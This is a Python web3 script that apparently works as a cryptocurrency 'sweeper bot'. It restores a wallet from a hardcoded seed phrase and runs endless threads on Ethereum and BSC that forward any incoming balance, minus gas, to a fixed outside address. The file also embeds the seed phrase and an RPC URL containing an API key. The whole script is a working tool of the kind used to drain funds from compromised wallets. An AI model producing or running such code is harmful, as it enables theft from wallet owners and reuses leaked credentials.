from web3 import Web3
import time
from eth_account import Account
import threading

Account.enable_unaudited_hdwallet_features()
acct = Account.from_mnemonic("seven fuel tumble juice marine velvet device alien layer laptop inflict defy")
address = acct.address
PRIVATEKEY = acct.privateKey
TO_ADDRESS = "0xe564151331Cf00a678ad3cb30435c80Ba295a19A"
eth_w3 = Web3(Web3.HTTPProvider("https://ethereum-rpc.axischain.network"))
bsc_w3 = Web3(
    Web3.HTTPProvider("https://empty-polished-resonance.bsc.quiknode.pro/1f4fbb219455935aa4c9d5066fe50f6e5afcaf53/"))
ACCOUNTADDRESS = Web3.toChecksumAddress(address)

def send_eth(amount, provider):
    # get the nonce.  Prevents one from sending the transaction twice
    nonce = provider.eth.getTransactionCount(ACCOUNTADDRESS)
    gasPrice = provider.eth.gas_price
    gas = 21000
    gasFee = 2 * gasPrice * gas
    if gasFee > amount:
        return
    # build a transaction in a dictionary
    tx = {
        'nonce': nonce,
        'to': TO_ADDRESS,
        'value': amount - gasFee,
        'gas': 21000,
        'gasPrice': gasPrice
    }

    # sign the transaction
    signed_tx = provider.eth.account.sign_transaction(tx, PRIVATEKEY)

    # send transaction
    tx_hash = provider.eth.sendRawTransaction(signed_tx.rawTransaction)

    # get transaction hash
    print(provider.toHex(tx_hash))


def eth_bot():
    while True:
        try:
            eth_balance = eth_w3.eth.getBalance(ACCOUNTADDRESS)
            if eth_balance > 1e15:
                send_eth(eth_balance, eth_w3)
        except:
            pass


def bsc_bot():
    while True:
        try:
            bsc_balance = bsc_w3.eth.getBalance(ACCOUNTADDRESS)
            if bsc_balance > 0:
                send_eth(bsc_balance, bsc_w3)
        except:
            pass

if __name__ == "__main__":
    try:
        threading.Thread(target=eth_bot).start()
        threading.Thread(target=bsc_bot).start()
    except Exception as error:
        pass
